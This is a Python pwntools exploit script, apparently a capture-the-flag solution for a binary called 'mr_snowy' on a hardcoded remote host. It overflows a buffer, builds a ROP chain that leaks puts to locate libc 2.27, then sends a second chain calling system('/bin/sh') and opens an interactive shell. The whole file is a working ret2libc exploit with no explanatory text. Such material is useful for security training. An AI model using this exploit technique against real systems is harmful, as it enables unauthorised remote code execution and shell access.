from pwn import *

host = "138.68.129.154"
port = 31276

offset = 72
pop_rdi = 0x00000000004015c3
ret = 0x000000000040087e

elf = ELF("./mr_snowy")
# s = elf.process()
s = remote(host, port)

puts_plt = elf.symbols["puts"]
main_plt = elf.symbols["main"]

puts_got = elf.got["puts"]
rop = [
	pop_rdi,
	puts_got,
	puts_plt,
	main_plt
]

rop = b"".join([p64(i) for i in rop])
payload = b"A"*offset + rop

# to run the libc leak address
print(s.recvuntil(b"> ").decode())
print("1")
s.sendline(b"1")
print(s.recvuntil(b"> ").decode())

print(payload)
s.sendline(payload)
print(s.recvuntil(b"\x1B[1;31m"))

print(s.recvline().decode())
print(s.recvline().decode())
leakPuts = u64(s.recvuntil(b"\n").rstrip().ljust(8,b"\x00"))
log.info(f"Leak Puts: {hex(leakPuts)}")

libc = ELF("libc6_2.27-3ubuntu1.4_amd64.so")
libc.address = leakPuts - libc.symbols["puts"]
log.info(f"libc base address found at {hex(libc.address)}")

bin_sh = next(libc.search(b'/bin/sh'))
system = libc.symbols['system']
exit = libc.symbols['exit']

rop = [
	ret,
	pop_rdi,
	bin_sh,
	system,
	exit
]

rop = b''.join([p64(i) for i in rop])
payload = b"A"*offset + rop

# to get into bin sh
print(s.recvuntil(b"> ").decode())
print("1")
s.sendline(b"1")
print(s.recvuntil(b"> ").decode())

print(payload)
s.sendline(payload)

s.interactive()

s.close()